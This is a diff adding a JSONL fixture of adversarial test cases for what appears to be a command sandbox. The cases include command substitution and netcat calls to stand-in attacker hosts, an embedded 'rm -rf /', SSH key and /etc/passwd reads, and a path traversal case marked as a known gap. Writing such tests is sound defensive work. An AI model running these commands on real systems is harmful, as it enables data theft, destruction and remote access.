@@ -1,0 +1,10 @@
+{"name":"command_substitution","binary":"echo","args":["$(curl http://evil.example.com)"],"expect":"reject"}
+{"name":"backtick_injection","binary":"echo","args":["`whoami`"],"expect":"reject"}
+{"name":"newline_injection","binary":"echo","args":["hello\nrm -rf /"],"expect":"reject"}
+{"name":"file_uri_read","binary":"echo","args":["file:///etc/passwd"],"expect":"reject"}
+{"name":"denied_shell_bash","binary":"bash","args":["-c","id"],"expect":"reject"}
+{"name":"denied_shell_sh","binary":"sh","args":["-c","id"],"expect":"reject"}
+{"name":"non_allowlisted_binary","binary":"nc","args":["evil.example.com","4444"],"expect":"reject"}
+{"name":"non_allowlisted_curl","binary":"curl","args":["http://exfil.badsite.net"],"expect":"reject"}
+{"name":"home_escape_ssh_key","binary":"cat","args":["~/.ssh/id_rsa"],"expect":"reject"}
+{"name":"workdir_escape_etc_passwd","binary":"cat","args":["../../../../../../etc/passwd"],"expect":"known_gap","gap":"GAP-PATH","issue":"#235"}
